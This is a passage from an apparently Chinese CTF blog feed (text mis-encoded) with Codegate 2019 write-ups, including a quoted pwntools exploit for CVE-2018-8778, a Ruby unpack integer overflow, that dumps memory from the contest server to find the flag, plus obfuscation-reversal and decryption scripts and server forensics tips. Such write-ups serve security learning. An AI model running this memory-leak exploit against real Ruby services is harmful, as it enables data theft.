<span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xFE</span>, <span class="number">0xFE</span>, <span class="number">0xFE</span>, <span class="number">0xFE</span>, <span class="number">0x82</span>, <span class="number">0x00</span>, <span class="number">0xEE</span>, <span class="number">0x6C</span>, <span class="number">0x82</span>, <span class="number">0x00</span>, <span class="number">0xBA</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xE3</span>, <span class="number">0xE3</span>, <span class="number">0xF3</span>, <span class="number">0xF3</span>, <span class="number">0xFB</span>, <span class="number">0xFB</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xDF</span>, <span class="number">0xDF</span>, <span class="number">0xCF</span>, <span class="number">0xCF</span>, <span class="number">0xC7</span>, <span class="number">0xC7</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x81</span>, <span class="number">0x81</span>, <span class="number">0xA5</span>, <span class="number">0xA5</span>, <span class="number">0x81</span>, <span class="number">0x81</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x81</span>, <span class="number">0xE7</span>, <span class="number">0x81</span>, <span class="number">0xFF</span>, <span class="number">0x81</span>, <span class="number">0xDB</span>, <span class="number">0x81</span>, <span class="number">0xDB</span>, <span class="number">0x81</span>, <span class="number">0xDB</span>, <span class="number">0x81</span>, <span class="number">0xC3</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x81</span>, <span class="number">0xFF</span>, <span class="number">0x81</span>, <span class="number">0xFF</span>, <span class="number">0x81</span>, <span class="number">0x99</span>, <span class="number">0x81</span>, <span class="number">0x99</span>, <span class="number">0x81</span>, <span class="number">0x99</span>, <span class="number">0x81</span>, <span class="number">0x99</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0x81</span>, <span class="number">0x81</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xA5</span>, <span class="number">0xA5</span>, <span class="number">0x81</span>, <span class="number">0x81</span>, <span class="number">0xC3</span>, <span class="number">0xDB</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0xFF</span>, <span class="number">0xE7</span>, <span class="number">0xFF</span>, <span class="number">0xC3</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xA5</span>, <span class="number">0xFF</span>, <span class="number">0x81</span>, <span class="number">0xE7</span>, <span class="number">0xDB</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x1F</span>, <span class="number">0x1F</span>, <span class="number">0x31</span>, <span class="number">0x3F</span>, <span class="number">0x61</span>, <span class="number">0x7F</span>, <span class="number">0xC1</span>, <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0xFF</span>, <span class="number">0x61</span>, <span class="number">0x7F</span>, <span class="number">0x3F</span>, <span class="number">0x3F</span>, <span class="number">0x1F</span>, <span class="number">0x1F</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x9D</span>, <span class="number">0xE3</span>, <span class="number">0x8D</span>, <span class="number">0xF3</span>, <span class="number">0x85</span>, <span class="number">0xFB</span>, <span class="number">0xA1</span>, <span class="number">0xDF</span>, <span class="number">0xB1</span>, <span class="number">0xCF</span>, <span class="number">0xB9</span>, <span class="number">0xC7</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>]</span><br><span class="line"></span><br><span class="line">tiles = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">18</span>):</span><br><span class="line">    tiles += [[data[x * <span class="number">16</span> + y] <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">16</span>)]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> [<span class="number">13</span>, <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]:</span><br><span class="line">    tile = tiles[c]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> tile:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'0'</span>*<span class="number">8</span> + bin(x)[<span class="number">2</span>:])[<span class="number">-8</span>:].replace(<span class="string">'0'</span>, <span class="string">' '</span>).replace(<span class="string">'1'</span>, <span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'\n'</span></span><br></pre></td></tr></table></figure><h1 id="mini-converter"><a href="#mini-converter" class="headerlink" title="mini converter"></a>mini converter</h1><p>ç»™äº†ä¸€ä»½rubyçš„æºç ã€‚çœ‹äº†writeupçŸ¥é“äº†æ˜¯<a href="https://blog.sqreen.io/buffer-under-read-ruby/" target="_blank" rel="noopener">CVE-2018-8778</a>ã€‚rubyçš„ç‰ˆæœ¬åœ¨2.5.1ä¹‹å‰å­˜åœ¨è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ•´æ•°æº¢å‡ºæ¼æ´ï¼Œæ¼æ´å¦‚ä¸‹ï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts input.unpack(<span class="string">"C*<span class="subst">#&#123;input&#125;</span>.length"</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°†è¾“å…¥è½¬æ¢æˆunpackæ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶unpackçš„ç»“æœæ¥æ³„æ¼flagã€‚åœ¨rubyçš„unpackæ ¼å¼ä¸­ï¼Œ<code>@</code>å¯ä»¥è·³è¿‡å‚æ•°é•¿åº¦ç»™çš„åç§»ã€‚å¦‚æœæˆ‘ä»¬é€ä¸€ä¸ªå¾ˆå¤§çš„æ­£æ•°ï¼Œé‚£ä¹ˆå°±ä¼šæº¢å‡ºæˆè´Ÿæ•°ã€‚ä»è€Œæˆ‘ä»¬å¯ä»¥æ³„éœ²ä¹‹å‰çš„å†…å®¹ï¼ŒåŒ…æ‹¬flagã€‚è¿™é‡Œæ”¾ä¸€ä¸‹<a href="https://github.com/leesh3288/CTF/blob/master/2019/CODEGATE/mini%20converter/mini_converter_writeup.md" target="_blank" rel="noopener">å¤§ä½¬çš„exp</a>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'110.10.147.105'</span>, <span class="number">12137</span>)</span><br><span class="line">p.recvuntil(<span class="string">'to exit\n'</span>)</span><br><span class="line">targlen = <span class="number">0x10000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    payload = <span class="string">'a @&#123;&#125;a&#123;&#125; '</span>.format(<span class="number">2</span>**<span class="number">64</span> - targlen*i, targlen + <span class="number">0x100</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'hex\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'memdump #&#123;&#125;'</span>.format(i)</span><br><span class="line">    data = p.recvuntil(<span class="string">'to exit\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'FLAG&#123;'</span> <span class="keyword">in</span> data:</span><br><span class="line">        st = data.find(<span class="string">'FLAG&#123;'</span>)</span><br><span class="line">        <span class="keyword">print</span> data[st:data.find(<span class="string">'&#125;'</span>, st) + <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="PyProt3ct"><a href="#PyProt3ct" class="headerlink" title="PyProt3ct"></a>PyProt3ct</h1><p>ä¸€é“æœ‰ç‚¹éš¾çš„è™šæ‹Ÿæœºï¼Œæ‰€æœ‰çš„å˜é‡è¿˜æœ‰å‡½æ•°åå‡ ä¹éƒ½æ˜¯å½¢å¦‚<code>O0O0OOO00OO00O000</code>çš„æ··æ·†ã€‚å…ˆç®€å•åœ°è§£æ··æ·†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f = open(<span class="string">'play.py.bak'</span>)</span><br><span class="line">t = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="comment"># func</span></span><br><span class="line">pat = <span class="string">r'def ([O0]&#123;17&#125;)'</span></span><br><span class="line">reg = re.compile(pat)</span><br><span class="line">func = reg.findall(t)[:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(func)):</span><br><span class="line">  t = t.replace(func[i], <span class="string">'f&#123;&#125;'</span>.format(str(i)))</span><br><span class="line"><span class="comment"># arg</span></span><br><span class="line">pat = <span class="string">r'def f\d\d?\(([O0]&#123;17&#125;)\)'</span></span><br><span class="line">reg = re.compile(pat)</span><br><span class="line">arg = reg.findall(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(arg)):</span><br><span class="line">  t = t.replace(arg[i], <span class="string">'dic'</span>)</span><br><span class="line"><span class="comment"># else</span></span><br><span class="line">pat = <span class="string">r'([O0]&#123;17&#125;)=dict\(\)'</span></span><br><span class="line">reg = re.compile(pat)</span><br><span class="line">dic = reg.findall(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(dic)):</span><br><span class="line">  t = t.replace(dic[i], <span class="string">'dic'</span>)</span><br><span class="line">pat = <span class="string">r'([O0]&#123;17&#125;)=1000'</span></span><br><span class="line">reg = re.compile(pat)</span><br><span class="line">ret_addr = reg.findall(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ret_addr)):</span><br><span class="line">  t = t.replace(ret_addr[i], <span class="string">'ret_addr'</span>)</span><br><span class="line">pat = <span class="string">r'([O0]&#123;17&#125;)=1001'</span></span><br><span class="line">reg = re.compile(pat)</span><br><span class="line">ret_val = reg.findall(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ret_val)):</span><br><span class="line">  t = t.replace(ret_val[i], <span class="string">'ret_val'</span>)</span><br><span class="line">pat = <span class="string">r'([O0]&#123;17&#125;)=2001'</span></span><br><span class="line">reg = re.compile(pat)</span><br><span class="line">str1 = reg.findall(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">  t = t.replace(str1[i], <span class="string">'str1'</span>)</span><br><span class="line">pat = <span class="string">r'([O0]&#123;17&#125;)=2002'</span></span><br><span class="line">reg = re.compile(pat)</span><br><span class="line">str2 = reg.findall(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">  t = t.replace(str2[i], <span class="string">'str2'</span>)</span><br><span class="line">pat = <span class="string">r'([O0]&#123;17&#125;)=2003'</span></span><br><span class="line">reg = re.compile(pat)</span><br><span class="line">str3 = reg.findall(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str3)):</span><br><span class="line">  t = t.replace(str3[i], <span class="string">'str3'</span>)</span><br><span class="line">pat = <span class="string">r'([O0]&#123;17&#125;)=2004'</span></span><br><span class="line">reg = re.compile(pat)</span><br><span class="line">str4 = reg.findall(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str4)):</span><br><span class="line">  t = t.replace(str4[i], <span class="string">'str4'</span>)</span><br><span class="line"><span class="comment"># rest</span></span><br><span class="line">pat = <span class="string">r'([O0]&#123;17&#125;)'</span></span><br><span class="line">reg = re.compile(pat)</span><br><span class="line">rest = reg.findall(t)</span><br><span class="line">rest = list(set(rest))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(rest)):</span><br><span class="line">  t = t.replace(rest[i], <span class="string">'x&#123;&#125;'</span>.format(str(i)))</span><br><span class="line">f = open(<span class="string">'play.py'</span>, <span class="string">'wb'</span>)</span><br><span class="line">f.write(t)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center">key</th><th style="text-align:center">content (purpose)</th></tr></thead><tbody><tr><td style="text-align:center">1000</td><td style="text-align:center">return address (mostly int, but object is theoretically possible)</td></tr><tr><td style="text-align:center">1001</td><td style="text-align:center">return value (mostly int, but object is theoretically possible)</td></tr><tr><td style="text-align:center">2001, 2002, 2003, 2004</td><td style="text-align:center">instruction argument (== oparg) (always byte array)</td></tr></tbody></table><p><a href="https://blog.metamon.xyz/2019/01/31/codegate-2019-qual-writeup/" target="_blank" rel="noopener">ä»¥ä¸Šå‡ ä¸ªæ•°å­—åˆ¤æ–­å¯¹åº”å‡ ä¸ªkey</a>ã€‚ç„¶åé€ä¸ªå‡½æ•°åˆ¤æ–­æŒ‡ä»¤åŠŸèƒ½ã€‚è¿™é‡Œæ”¾ä¸€ä¸‹<a href="https://raw.githubusercontent.com/pwning/public-writeup/master/codegate2019/pyprot3ct/play.py" target="_blank" rel="noopener">pppå¤§ä½¬ç»™çš„åˆ†æè„šæœ¬</a>ã€‚è®°å½•ä¸€ä¸‹<a href="https://balsn.tw/ctf_writeup/20190126-codegatectf/#pyprot3ct" target="_blank" rel="noopener">Balsnå¤§ä½¬ä»¬ç»™çš„åŠ å¯†è¿‡ç¨‹</a>å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(x)</span>:</span></span><br><span class="line">    a = x &gt;&gt; <span class="number">32</span></span><br><span class="line">    a ^= <span class="number">0xffc2bdec</span></span><br><span class="line">    a += <span class="number">0xffc2bdec</span></span><br><span class="line">    a &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">    b = x &amp; <span class="number">0xffffffff</span></span><br><span class="line">    b ^= <span class="number">0xffc2bdec</span></span><br><span class="line">    b += <span class="number">0xffc2bdec</span></span><br><span class="line">    b &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">    c = ((b &lt;&lt; <span class="number">32</span>) | a)&amp;<span class="number">0xffffffffffffffff</span></span><br><span class="line">    d = ((c &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">57</span>)&amp;<span class="number">0xffffffffffffffff</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ((c &gt;&gt; <span class="number">7</span>) | d) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line"></span><br><span class="line">flag = str(input())</span><br><span class="line">flag = int(<span class="string">'0x'</span> + flag.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x7f</span>):</span><br><span class="line">    flag = encrypt(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(flag)</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="number">0xd274a5ce60ef2dca</span></span><br></pre></td></tr></table></figure><p><a href="https://balsn.tw/ctf_writeup/20190126-codegatectf/#pyprot3ct" target="_blank" rel="noopener">Balsnå¤§ä½¬ä»¬çš„solveè„šæœ¬</a>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(x)</span>:</span></span><br><span class="line">    c = ((x &lt;&lt; <span class="number">7</span>) | (x &gt;&gt; <span class="number">57</span>))&amp;<span class="number">0xffffffffffffffff</span></span><br><span class="line">    b = ((((c &gt;&gt; <span class="number">32</span>)&amp;<span class="number">0xffffffff</span>)<span class="number">-0xffc2bdec</span>)&amp;<span class="number">0xffffffff</span>)^<span class="number">0xffc2bdec</span></span><br><span class="line">    a = (((c&amp;<span class="number">0xffffffff</span>)<span class="number">-0xffc2bdec</span>)&amp;<span class="number">0xffffffff</span>)^<span class="number">0xffc2bdec</span></span><br><span class="line">    <span class="keyword">return</span> ((a &lt;&lt; <span class="number">32</span>) | b)&amp;<span class="number">0xffffffffffffffff</span></span><br><span class="line"></span><br><span class="line">flag = <span class="number">0xd274a5ce60ef2dca</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0x7f</span>):</span><br><span class="line">    flag = decrypt(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(flag)</span><br><span class="line"><span class="keyword">print</span> hex(flag)[<span class="number">2</span>:<span class="number">-1</span>:].decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒç½‘ç«™"><a href="#å‚è€ƒç½‘ç«™" class="headerlink" title="å‚è€ƒç½‘ç«™"></a>å‚è€ƒç½‘ç«™</h1><p><a href="https://lordidiot.github.io/2019-01-27/codegate-junior-quals-2019/" target="_blank" rel="noopener">https://lordidiot.github.io/2019-01-27/codegate-junior-quals-2019/</a><br><a href="https://tcode2k16.github.io/blog/posts/2019-01-27-codegate-qualifier-writeup/" target="_blank" rel="noopener">https://tcode2k16.github.io/blog/posts/2019-01-27-codegate-qualifier-writeup/</a><br><a href="https://blog.csdn.net/u010376788/article/details/49764205" target="_blank" rel="noopener">https://blog.csdn.net/u010376788/article/details/49764205</a><br><a href="https://blog.pspaul.de/posts/codegate-pre-2019-pyprot3ct/" target="_blank" rel="noopener">https://blog.pspaul.de/posts/codegate-pre-2019-pyprot3ct/</a><br><a href="https://devel0pment.de/?p=1179" target="_blank" rel="noopener">https://devel0pment.de/?p=1179</a><br><a href="https://ctftime.org/writeup/12955" target="_blank" rel="noopener">https://ctftime.org/writeup/12955</a><br><a href="https://balsn.tw/ctf_writeup/20190126-codegatectf/" target="_blank" rel="noopener">https://balsn.tw/ctf_writeup/20190126-codegatectf/</a><br><a href="https://github.com/leesh3288/CTF/blob/master/2019/CODEGATE/mini%20converter/mini_converter_writeup.md" target="_blank" rel="noopener">https://github.com/leesh3288/CTF/blob/master/2019/CODEGATE/mini%20converter/mini_converter_writeup.md</a><br><a href="https://blog.metamon.xyz/2019/01/31/codegate-2019-qual-writeup/" target="_blank" rel="noopener">https://blog.metamon.xyz/2019/01/31/codegate-2019-qual-writeup/</a><br><a href="https://github.com/pwning/public-writeup/tree/master/codegate2019/pyprot3ct" target="_blank" rel="noopener">https://github.com/pwning/public-writeup/tree/master/codegate2019/pyprot3ct</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ‰“äº†ä¸€æ¬¡CodegateçœŸæ»´å¤ªéš¾äº†ã€‚è·Ÿç€å›½å¤–å¤§ä½¬çš„writeupå¤ç°è¿˜æ˜¯å­¦åˆ°äº†ä¸€ç‚¹ä¸œè¥¿ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="review" scheme="https://qianfei11.github.io/tags/review/"/>
    
  </entry>
  
  <entry>
    <title>2018-å®‰æ’æ¯åäºŒæœˆæœˆèµ›-writeup</title>
    <link href="https://qianfei11.github.io/2019/01/25/%E3%80%90%E6%9C%AA%E5%AE%8C%E6%88%90%E3%80%912018-%E5%AE%89%E6%81%92%E6%9D%AF%E5%8D%81%E4%BA%8C%E6%9C%88%E6%9C%88%E8%B5%9B-writeup/"/>
    <id>https://qianfei11.github.io/2019/01/25/ã€æœªå®Œæˆã€‘2018-å®‰æ’æ¯åäºŒæœˆæœˆèµ›-writeup/</id>
    <published>2019-01-25T08:12:19.000Z</published>
    <updated>2019-02-01T12:11:22.387Z</updated>
    
    <content type="html"><![CDATA[<p>è®°å½•ä¸¤é“pwné¢˜ã€‚</p><a id="more"></a><h1 id="messageb0x"><a href="#messageb0x" class="headerlink" title="messageb0x"></a>messageb0x</h1><p>åŸºç¡€çš„æ ˆæº¢å‡ºã€‚</p><h1 id="smallorange"><a href="#smallorange" class="headerlink" title="smallorange"></a>smallorange</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è®°å½•ä¸¤é“pwné¢˜ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="wp" scheme="https://qianfei11.github.io/tags/wp/"/>
    
      <category term="pwn" scheme="https://qianfei11.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup</title>
    <link href="https://qianfei11.github.io/2018/12/08/2018-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%80%BB%E5%86%B3%E8%B5%9B-%E6%95%B0%E6%8D%AE%E8%B5%9B-writeup/"/>
    <id>https://qianfei11.github.io/2018/12/08/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/</id>
    <published>2018-12-08T11:44:17.000Z</published>
    <updated>2018-12-09T07:15:18.819Z</updated>
    
    <content type="html"><![CDATA[<p>ç¬¬ä¸€æ¬¡å‚åŠ é“ä¸‰ï¼Œè¿™æ¬¡æ€»å†³èµ›ä¸­çš„æ•°æ®èµ›ä¸å†æ˜¯ä¹‹å‰çš„çœ‹æ•°æ®åŒ…ï¼Œè€Œæ˜¯ç›´æ¥ç»™äº†ä¸€å°webæœåŠ¡å™¨æº¯æºã€‚</p><a id="more"></a><h1 id="ç»éªŒæ€»ç»“"><a href="#ç»éªŒæ€»ç»“" class="headerlink" title="ç»éªŒæ€»ç»“"></a>ç»éªŒæ€»ç»“</h1><p>ç¬¬ä¸€æ¬¡æ¥è§¦ï¼Œå…¨é˜Ÿä¹Ÿå°±è‡ªå·±ä¸€ä¸ªäººåœ¨åšï¼ŒæŒ–äº†å‘ä¹Ÿå¡«äº†å‘ï¼Œè®°å½•ä¸€ä¸‹ã€‚</p><ol><li>æœåŠ¡å™¨ç»™çš„æ˜¯å‘½ä»¤è¡Œç•Œé¢ï¼Œä¸ç”¨æƒ³ç€å˜æˆå›¾å½¢ç•Œé¢æ¥æ“ä½œã€‚å› ä¸ºæˆ‘<code>init 5</code>å˜æˆå›¾å½¢ç•Œé¢åå‘ç°å®Œå…¨æ²¡æ³•æ“ä½œâ€¦åæ¥ä¸ºäº†å˜å›å»æˆ‘è¯¯ä»¥ä¸ºæ˜¯<code>init 0</code>ï¼Œç›´æ¥æŠŠæœåŠ¡å™¨å…³äº†â€¦åæ¥åªèƒ½è®©è®©ä¸»åŠæ–¹å¸®å¿™é‡å¯ä¸€ä¸‹ï¼Œå·®ç‚¹è¢«æ‰£åˆ†â€¦</li><li>åˆšå¼€å§‹çš„æ—¶å€™æˆ‘ä¸»è¦ç›®æ ‡æ˜¯åœ¨æ¯ä¸ªç”¨æˆ·çš„å®¶ç›®å½•ä»¥åŠwebæœåŠ¡çš„æ ¹ç›®å½•ä¸‹æŸ¥çœ‹æ˜¯å¦æœ‰ä¸€äº›éšè—æ–‡ä»¶ï¼Œè¿˜æ˜¯å¯ä»¥æ”¶é›†åˆ°ä¸€äº›é‡è¦ä¿¡æ¯çš„ã€‚</li><li>ç„¶ååœ¨æ•°æ®åº“çš„ç›®å½•ä¸‹ä¹Ÿå¯ä»¥å‘ç°ä¸€äº›ä¿¡æ¯ã€‚</li><li>ä¹‹åæ…¢æ…¢å‘ç°æœ€é‡è¦å…¶å®æ˜¯webæœåŠ¡ä¸‹çš„ä¸€äº›logæ–‡ä»¶ï¼Œè®°å½•äº†é»‘å®¢å¯¹æœåŠ¡å™¨æ”»å‡»çš„ä¸»è¦è¿‡ç¨‹ã€‚</li><li>åæ¥æˆ‘è¿˜å‘ç°åœ¨æ¯ä¸ªç”¨æˆ·å®¶ç›®å½•ä¸‹çš„<code>.bash_history</code>ä¹Ÿæ˜¯å¾ˆæœ‰ç”¨çš„ï¼Œå¯ä»¥çœ‹åˆ°é»‘å®¢ææƒåå¹²çš„äº‹æƒ…ã€‚</li><li>æŸ¥çœ‹æ–‡ä»¶çš„è¯ï¼Œå»ºè®®ç”¨<code>less -mN filename</code>ï¼Œå› ä¸ºçº¯å‘½ä»¤è¡Œçš„ç•Œé¢ä¸èƒ½æ»šå±ï¼Œç”¨<code>less</code>å°±ä¼šæ–¹ä¾¿å¾ˆå¤šã€‚</li><li>åˆšç™»ä¸ŠæœåŠ¡å™¨å»ºè®®<code>lastlog</code>ä¸€ä¸‹ï¼Œçœ‹çœ‹é™¤äº†rootç”¨æˆ·ä¹‹å¤–å…¶ä»–ç”¨æˆ·æœ€åä¸€æ¬¡æ˜¯ä»€ä¹ˆæ—¶å€™ç™»é™†çš„ã€‚</li><li>å…¶ä»–å‘½ä»¤çš„è¯ï¼Œå¸¸ç”¨<code>grep</code>è‚¯å®šæ˜¯æ²¡é”™çš„â€¦</li></ol><p>ç„¶åæ¯”èµ›çš„æ—¶å€™ä¹Ÿæ‰¾äº†ä¸¤ç¯‡å…³äºæœåŠ¡å™¨æº¯æºçš„æ–‡ç« ï¼Œè®°å½•ä¸€ä¸‹ï¼š</p><ul><li><a href="https://www.freebuf.com/articles/web/138867.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/138867.html</a></li><li><a href="https://www.freebuf.com/articles/rookie/179638.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/rookie/179638.html</a></li></ul><p>æ¯”èµ›çš„æ—¶å€™å› ä¸ºæˆ‘ä»¬é˜Ÿæ’ååœ¨åæ¥ä¸æ˜¯å¾ˆé 